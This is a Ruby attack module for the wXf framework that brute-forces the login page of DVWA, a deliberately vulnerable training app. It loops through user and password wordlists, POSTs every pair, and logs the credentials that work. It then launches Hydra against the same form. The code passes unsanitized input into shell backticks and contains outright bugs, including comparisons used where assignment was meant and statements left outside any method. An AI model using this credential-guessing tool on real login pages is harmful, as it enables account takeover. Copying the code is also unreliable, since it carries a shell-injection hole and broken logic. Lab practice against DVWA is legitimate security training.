class WebXploit < WXf::WXfmod_Factory::Auxiliary
 #Every wXf module whether auxiliary, exploit or otherwise 
 #must include the following class definition. The portion 
 #that specifies this as an auxiliary module is 
 #< WXf::WXfmod_Factory::Auxiliary. Append the 'end' tag to
 # close the class and finalize the module.
 #If the module is to perform an HTTP(s) action, then an
 #assist module must be included. 
 #To include the MechReq (HTTPs(s)) assist module:
include WXf::WXfassists::General::MechReq

 
  def initialize
  #Every wXf module must initialize and create values that 
  #are utilized elsewhere in the framework. This is the 'initialize' 
  #method and every module must use it. 
  #The values specified within super() are very self-explanatory. 
  
      super(
        'Name'        => 'Bruteforce DVWA login #4',
        'Version'     => '4',
        'Description' => %q{ Bruteforce authentication for DVWA },
        'Author'      => ['kacos2000' , '2015' ],
        'References'  =>
						[
						 ['URL', 'https://github.com/forced-request/wXf/wiki'],
						 ['URL', 'https://github.com/forced-request/wXf/wiki/Using-the-ruby-version'],
						 ['URL', 'https://github.com/forced-request/wXf/wiki/Creating-an-Auxiliary-Module'],
						 ['URL', 'https://github.com/forced-request/wXf/wiki/Advanced-options'],
						 ['URL', 'https://github.com/forced-request/wXf/wiki/General'],
						 ['URL', 'http://ruby-doc.org/core-1.9.3/'],
						 ['URL', 'http://www.rubyinside.com/21-ruby-tricks-902.html'],
						 ['URL', 'http://www.sitepoint.com/guide-ruby-collections-part-arrays/'],
						 ['URL', 'http://alvinalexander.com/blog/post/ruby/how-execute-external-shell-command-expansion'],
						 ['URL', 'http://rubylearning.com/satishtalim/ruby_regular_expressions.html'],
						 ['URL', 'http://en.wikibooks.org/wiki/Ruby_Programming/Syntax/Literals'],
						 ['URL', 'http://www.tutorialspoint.com/ruby/ruby_operators.htm'],
						 ['URL', 'http://rubyquicktips.com/post/5862861056/execute-shell-commands'],
						 ['URL', 'http://thaiwood.io/running-bash-commands-from-ruby/'],
						 ['URL', 'http://tech.natemurray.com/2007/03/ruby-shell-commands.html'],
						 ['URL', 'http://ruby.bastardsbook.com/chapters/io/'],
						 ['URL', 'http://ascii-table.com/ansi-escape-sequences.php'],
						 ['URL', 'http://wiki.bash-hackers.org/scripting/terminalcodes']
						],
        'License'     => WXF_LICENSE
		)
		
		#Before finishing the initialize function and closing it with the end tag, 
		#we need to specify any additional options that the module developer wishes 
		#to expose to the user. By default, when an assist module is included, 
		#default options are already available. An example of a default option, 
		#which is included in every assist module, would be the RURL. You can find
		#which options will be displayed to the users on the Assists Page.
		
		#If calling a DEFAULT assit option, you can call it by its lowercase equivalent (wiki/General).
        init_opts([
					OptString.new('RURL',    [true, "Location of DVWA ie http://127.0.0.1", ""]),    
					OptString.new('DVPATH',  [true, "DVWA path, page and params to try ie /dvwa/login.php", ""]),    
					OptString.new('USERLIST',[true, "Filename and full path of USER list", ""]),
					OptString.new('PASSLIST',[true, "Filename and full path of PASSWORD list", ""]),
					OptString.new('LOG',     [true, "Log File to save results - default is root/Desktop/dvwa.txt", ""]),
					])
	end #end init
	
  def run	# This function calls the module from wXf
	puts `clear` #clear the terminal screen
	prnt_gen("\e[1m	DVWA Login Brute Force Module \e[0m
	---------\e[33m	\e[1m
	 //^ ^\\
	(/(_*_)\)
	_/’”*”\_
	(/_)^(_\)\e[0m
	---------")
	prnt_gen(Time.new.localtime)
	prnt_gen("Using " + `ruby -v`)
	# ----------------------------------------------------------------------------Check Optstrings
				i = 1 # set counter of correct combinations to 1
					  # so that the first valid result will be "1"	
				dvpath = datahash['DVPATH']
				rlog   = datahash['LOG']
						
				if datahash['USERLIST'].empty? 
					prnt_err("Please enter a USERLIST file including the path")
					datahash['USERLIST'] == gets 
				end # userlist
				if datahash['PASSLIST'].empty?
					prnt_err("Please enter a PASSLIST file including the path")
					datahash['PASSLIST'] == gets 
				end # passlist
				if datahash['RURL'].empty?
					prnt_err("Please enter the url ie: http://127.0.0.1 of DVWA")
					datahash['RURL'] == gets 
				end # rurl
				if  datahash['LOG'].empty?
					prnt_err("LOG missing - setting Log to default")
					rlog = "/root/Desktop/dvwa.txt"
				end # log 
				if  datahash['DVPATH'].empty?
					prnt_err("path missing - setting path to default")
					datahash['DVPATH'] == "/dvwa/login.php"
				end # dvpath
	# ------------------------------------------------------------------------------Count
				#Calculate total username/password combinations to be tried 
				u = `wc -l < #{datahash['USERLIST']}` # Use linux wc command to count lines in user
				p = `wc -l < #{datahash['PASSLIST']}` # and password lists
				combin = u.to_i * p.to_i #convert results to integers and multiply to get combinations
				
	# ------------------------------------------------------------------------------Show info
	prnt_plus("Starting bruteforce attack to DVWA server at: \e[31m#{rurl.match(/\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}/)}\e[0m")
	prnt_gen("Using => \e[33m" + datahash['USERLIST'] + "\e[0m and \e[33m" + datahash['PASSLIST'] + "\e[0m")
	prnt_gen("Making it a total \e[33m#{combin}\e[0m user/pass combinations !")
	# ------------------------------------------------------------------------------Ask to Break or not 
	prnt_err("Press ENTER to continue,  (n) to quit \a") # \n = Linefeed, \a = Terminal bell
					ans = gets().strip()
					if ans == 'n' 
					exit
					end
	# ------------------------------------------------------------------------------Log start time
		#Log Start Entry to Log File
		f = File.new(rlog,"a")
        f.puts "New Attemt at #{Time.now} trying a total #{combin} user/pass combinations !"
        f.puts "Using => #{datahash['USERLIST']} and #{datahash['PASSLIST']}"
        f.close
	# ------------------------------------------------------------------------------Brute Force Login loop
		
		# Opening the username file
		# and try each username
		ulist = datahash['USERLIST']
		username = File.open(ulist, "r")
		username.each do |username|
		username = username.strip  
		
		# now, for each user name, lets iterate each password
		# opening the password file
		plist = datahash['PASSLIST']
		password = File.open(plist, "r")
		password.each do |password|
		password = password.strip
		
	# ------------------------------------------------------------------------------POST 
		# (mech_req returns a Mechanize.get, put, post, delete or head object)
		# Send the following parameters to the dvwa login page each time
        rparams = "username=#{username}&password=#{password}&Login=Login"
        
			# with this POST request        
			res = mech_req({
			  'method'   => 'POST',
			  'RURL'     => rurl + dvpath ,
			  'RPARAMS'  => rparams ,
			  'HEADERS'  => {'Content-Type' => "application/x-www-form-urlencoded"} ,
						  }) 
				
						
		 # ------Valid Results-----------------------
         if (res.body =~ /You have logged in as(.*?)/ )
         prnt_dbg("#{res.code} ##{i} user: \e[1m#{username}\e[0m with pass: \e[1m#{password}\e[0m are valid")
         f = File.new(rlog,"a")
         f.puts "##{i} #{Time.now} => User: '#{username}' with pass: '#{password}' exists"
         f.close 
		 i = i + 1	# Add plus one (valid result) to the counter
					# so next result (if any) will be i + 1
					
		 end #end if Valid Results of brute forcing Login page 	
			
		  # ------Just to see if it works---------- # not valid combinations
		  #if (res.body =~ /Login failed/ )
          #prnt_err("\e[2m #{res.code} => #{username} and #{password} failed\e[0m")
          #end #end if
		  
		  # --------------------------------------- # close loop of reading user/pass files
	   end #reading passwords
	   end #reading usernames
		 
		 #-------------------------------------------------------------------------------Hydra
						prnt_plus("Starting Brute force attack with \e[31mHydra\e[0m ")  
						prnt_gen("Press ENTER to continue, (n) to quit \a ") 
						hyansw = gets().strip()
						if hyansw != 'n' 
						 
						# ----------------Hydra--------------------------------------------	
						usbr   =  datahash['USERLIST']  
						psbr   =  datahash['PASSLIST']
						dvip   = rurl.match(/\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}/)
						brut   =  "/dvwa/login.php"
						bbpars =  ":username=^USER^&password=^PASS^&Login=Login:Login failed"
						para1  =  " -e nsr #{dvip} -L #{usbr} -P #{psbr} -o #{rlog} http-post-form "
						para2  =  "\"#{brut}#{bbpars}\""
						hpara  =  "hydra" + para1 + para2
						prnt_plus `#{hpara}` 	# The actual Ruby command to invoke Hydra
						end #Hydra
						# Note: Hydra's restore file is in root directory of wXf
		# --------------------------------------------------------------------------------END	
			
    puts "\e[33m \e[1m 
             o   o
              )-(
             (O O)
              \=/
             .-'-.
            //\ /\\
          _// / \ \\_
         =./ {,-.} \.=
             || ||
             || ||   
           __|| ||__ \e[0m"
    puts "--------------------------------------------------------"
    prnt_gen("Tried #{combin} combinations and found #{i-1} valid results")
    prnt_dbg("Results were saved in the file: \e[33m#{rlog}\e[0m")  
    #-------------------------------------------------------------Log End Entry to Log File
		f = File.new(rlog,"a")
        f.puts "Finished at #{Time.now}. Tried a total #{combin} user/pass combinations !"
        f.puts "** Found #{i-1} valid results **"
        f.close
    end #run
		clear
	rescue
    exit
end # class
